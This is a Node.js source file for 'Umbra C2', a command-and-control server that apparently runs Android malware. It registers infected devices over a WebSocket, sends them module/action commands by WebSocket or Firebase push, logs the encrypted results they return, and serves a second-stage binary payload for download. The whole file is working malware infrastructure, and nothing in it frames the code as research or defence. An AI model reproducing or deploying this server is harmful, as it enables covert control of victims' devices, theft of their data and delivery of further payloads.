'use strict';

const fs = require('fs');
const path = require('path');
const https = require('https');
const { execSync } = require('child_process');
const { v4: uuidv4 } = require('uuid');
const express = require('express');
const { WebSocketServer } = require('ws');

const cryptoModule = require('./crypto');
const fcm = require('./fcm');

const PORT = process.env.PORT || 8443;
const CERT_DIR = path.join(__dirname, 'certs');
const KEY_PATH = path.join(CERT_DIR, 'server.key');
const CERT_PATH = path.join(CERT_DIR, 'server.crt');
const STAGE2_DIR = path.join(__dirname, 'stage2');
const STAGE2_FILE = path.join(STAGE2_DIR, 'stage2.bin');

function timestamp() {
  return new Date().toISOString();
}

function log(level, ...args) {
  const ts = `[${timestamp()}]`;
  switch (level) {
    case 'error': console.error(ts, '[ERROR]', ...args); break;
    case 'warn':  console.warn(ts,  '[WARN]',  ...args); break;
    case 'info':  console.log(ts,   '[INFO]',  ...args); break;
    case 'debug': console.log(ts,   '[DEBUG]', ...args); break;
  }
}

// ─── TLS ────────────────────────────────────────────────────────────────────

function ensureCerts() {
  if (!fs.existsSync(CERT_DIR)) fs.mkdirSync(CERT_DIR, { recursive: true });
  if (!fs.existsSync(KEY_PATH) || !fs.existsSync(CERT_PATH)) {
    log('info', 'Generating self-signed TLS certificate...');
    execSync(
      `openssl req -x509 -newkey rsa:4096 -keyout "${KEY_PATH}" -out "${CERT_PATH}" -days 365 -nodes -subj "/CN=umbra-c2"`,
      { stdio: 'inherit' }
    );
    log('info', 'TLS certificate generated.');
  } else {
    log('info', 'TLS certificates found.');
  }
}

// ─── Device Registry ────────────────────────────────────────────────────────

const devices = new Map(); // device_id → { ws, fcmToken, lastSeen, info, queue[] }

function getDevice(id) { return devices.get(id); }

function registerDevice(id, ws) {
  const existing = devices.get(id);
  if (existing) {
    existing.ws = ws;
    existing.lastSeen = Date.now();
    flushQueue(id);
  } else {
    devices.set(id, { ws, fcmToken: null, lastSeen: Date.now(), info: '{}', queue: [] });
  }
}

function flushQueue(id) {
  const dev = devices.get(id);
  if (!dev || !dev.ws || dev.ws.readyState !== 1) return;
  while (dev.queue.length > 0) {
    const cmd = dev.queue.shift();
    dev.ws.send(JSON.stringify(cmd));
    log('debug', `Flushed queued command to ${id}`);
  }
}

function sendCommand(id, module, action, params = {}) {
  const cmd = { cmd_id: uuidv4(), module, action, params };
  const dev = devices.get(id);
  if (dev && dev.ws && dev.ws.readyState === 1) {
    dev.ws.send(JSON.stringify(cmd));
    log('info', `Command sent via WS to ${id}: ${module}/${action}`);
  } else if (dev && dev.fcmToken && fcm.isConfigured()) {
    dev.queue.push(cmd);
    fcm.sendCommand(dev.fcmToken, cmd);
    log('info', `Command pushed via FCM to ${id}: ${module}/${action}`);
  } else {
    log('warn', `Device ${id} offline — no WS or FCM`);
    return false;
  }
  return true;
}

// ─── Express + HTTPS ────────────────────────────────────────────────────────

const app = express();
app.use(express.json());
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', '*');
  res.header('Access-Control-Allow-Methods', '*');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

// Health
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', uptime: process.uptime(), devices: devices.size, fcm: fcm.isConfigured() });
});

// Device list
app.get('/api/devices', (req, res) => {
  const list = [];
  for (const [id, dev] of devices) {
    list.push({
      device_id: id,
      fcm: !!dev.fcmToken,
      online: !!(dev.ws && dev.ws.readyState === 1),
      lastSeen: new Date(dev.lastSeen).toISOString(),
      info: dev.info
    });
  }
  res.json(list);
});

// Register FCM token
app.post('/api/register-fcm', (req, res) => {
  const { device_id, fcm_token } = req.body;
  if (!device_id || !fcm_token) return res.status(400).json({ error: 'missing device_id or fcm_token' });
  const dev = devices.get(device_id);
  if (dev) {
    dev.fcmToken = fcm_token;
    log('info', `FCM token registered for ${device_id}`);
  } else {
    devices.set(device_id, { ws: null, fcmToken: fcm_token, lastSeen: Date.now(), info: '{}', queue: [] });
    log('info', `Device ${device_id} created with FCM token`);
  }
  res.json({ status: 'ok' });
});

// Queue command
app.post('/api/command', (req, res) => {
  const { device_id, module, action, params } = req.body;
  if (!device_id || !module || !action) return res.status(400).json({ error: 'missing fields' });
  const sent = sendCommand(device_id, module, action, params || {});
  res.json({ status: sent ? 'sent' : 'queued_or_offline' });
});

// Receive result
app.post('/api/result', (req, res) => {
  const raw = req.body;
  let decrypted = raw;
  try {
    if (typeof raw === 'string') decrypted = cryptoModule.decrypt(raw);
    else if (typeof raw === 'object' && raw.p) decrypted = cryptoModule.decrypt(raw.p);
  } catch (e) {
    // result was plaintext (encryption disabled)
  }
  log('info', `Result: ${typeof decrypted === 'string' ? decrypted.substring(0, 200) : JSON.stringify(decrypted).substring(0, 200)}`);
  res.json({ status: 'ok' });
});

// Stage 2 payload
app.get('/api/stage2', (req, res) => {
  if (fs.existsSync(STAGE2_FILE)) {
    res.setHeader('Content-Type', 'application/octet-stream');
    fs.createReadStream(STAGE2_FILE).pipe(res);
  } else {
    res.status(404).json({ error: 'stage2 not deployed' });
  }
});

// ─── Start ──────────────────────────────────────────────────────────────────

ensureCerts();
fcm.init();
const tlsOptions = { key: fs.readFileSync(KEY_PATH), cert: fs.readFileSync(CERT_PATH) };
const server = https.createServer(tlsOptions, app);

// Raw WebSocket at /c2 (not Socket.IO — our Android client uses plain WS)
const wss = new WebSocketServer({ server, path: '/c2' });

wss.on('connection', (ws, req) => {
  const clientIp = req.socket.remoteAddress;
  log('info', `WS connection from ${clientIp}`);

  let deviceId = null;

  ws.on('message', (raw) => {
    const rawStr = Buffer.isBuffer(raw) ? raw.toString('utf8') : String(raw);
    log('debug', `WS message: ${rawStr.substring(0, 200)}`);

    // Try JSON parse for registration
    try {
      const msg = JSON.parse(rawStr);
      if (msg.type === 'register' && msg.device_id) {
        deviceId = msg.device_id;
        registerDevice(deviceId, ws);
        log('info', `Device registered: ${deviceId}`);
        ws.send(JSON.stringify({ type: 'registered', device_id: deviceId }));
        return;
      }
    } catch (e) { /* not JSON — treat as encrypted */ }

    // Encrypted data from device
    if (deviceId) {
      try {
        const decrypted = cryptoModule.decrypt(rawStr);
        log('info', `Result from ${deviceId}: ${decrypted.substring(0, 200)}`);
        try {
          const result = JSON.parse(decrypted);
          console.log('[RESULT]', JSON.stringify(result, null, 2));
        } catch (e) {
          console.log('[RESULT]', decrypted);
        }
      } catch (e) {
        log('warn', `Decrypt failed from ${deviceId}: ${e.message}`);
      }
    }
  });

  ws.on('close', () => {
    if (deviceId) {
      const dev = devices.get(deviceId);
      if (dev) dev.ws = null;
      log('info', `Device disconnected: ${deviceId}`);
    }
  });

  ws.on('error', (err) => {
    log('error', `WS error: ${err.message}`);
  });
});

server.listen(PORT, () => {
  const stageOk = fs.existsSync(STAGE2_FILE);
  console.log();
  console.log('╔════════════════════════════════════════════════════════╗');
  console.log('║              Umbra C2 Server                          ║');
  console.log('╠════════════════════════════════════════════════════════╣');
  console.log(`║  HTTPS      : https://0.0.0.0:${PORT}                  ║`);
  console.log(`║  WebSocket  : wss://0.0.0.0:${PORT}/c2                ║`);
  console.log(`║  FCM        : ${fcm.isConfigured() ? 'READY' : 'DISABLED'}                              ║`);
  console.log(`║  Stage 2    : ${stageOk ? 'DEPLOYED' : 'MISSING'}                          ║`);
  console.log('╚════════════════════════════════════════════════════════╝');
  console.log();
});

// Graceful shutdown
process.on('SIGINT', shutdown);
process.on('SIGTERM', shutdown);

function shutdown() {
  log('info', 'Shutting down...');
  for (const [id, dev] of devices) {
    if (dev.ws) dev.ws.close();
  }
  server.close(() => process.exit(0));
}
